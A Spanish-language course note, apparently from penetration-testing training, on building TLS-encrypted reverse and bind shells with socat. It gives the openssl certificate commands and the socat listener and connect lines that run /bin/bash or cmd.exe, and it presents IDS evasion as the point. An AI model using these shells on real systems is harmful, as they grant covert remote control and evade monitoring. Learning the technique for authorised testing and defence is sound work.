---
layout: apunte
title: "7. Socat Encrypted Shells"
---

Una de las mejores cosas sobre socat es su capacidad de crear shells encriptadas (tanto reverse como bind). Las shells encriptadas no son descifrables (a menos que tengas la clave de cifrado) lo que hace que muchos IDSs no puedan detectarlas.

No vamos a cubrir la sintaxis de nuevo. Basta con decir que cada sitio donde aparezca `TCP` hay que sustituirlo por `OPENSSL`.

Hablemos de certificados.

Necesitamos generar un certificado para poder usar shells encriptadas. Esto es más fácil de hacer en nuestra máquina:

`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`

Este comando crea una clave RSA de 2048 bits con su certificado correspondiente, auto-firmado y válido sólo por 362 días. Lo que te pide rellenar al ejecutar dicho comando puede ser dejado en blanco o rellenado aleatoriamente.

Ahora tenemos que combinar ambos archivos en un solo archivo `.pem`:

`cat shell.key shell.crt > shell.pem`

Y ahora, para configurar el listener reverse shell:

`socat OPENSSL-LISTEN:<puerto>,cert=shell.pem,verify=0 -`

Esto configura un listener OPENSSL usando nuestro certificado. Mientras, `verify=0` le dice a la conexión que no se preocupe por validar el certificado.

Para conectarnos de vuelta, usaríamos:

`socat OPENSSL:<ip_local>:<puerto_local>,verify=0 EXEC:/bin/bash`

La misma técnica aplicaría para la bind:

Objetivo:

`socat OPENSSL-LISTEN:<puerto>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`

Atacante:

`socat OPENSSL:<ip_objetivo>:<puerto_objetivo>, verify=0 -`

De nuevo, date cuenta de que incluso para un objetivo Windows, el certificado debe ser usado por el listener, por lo que para una bind shell se requiere copiar el archivo `.pem`.

Veamos un ejemplo, el atacante a la izquierda y el objetivo a la derecha:

!**Pasted image 20251124175937.png**
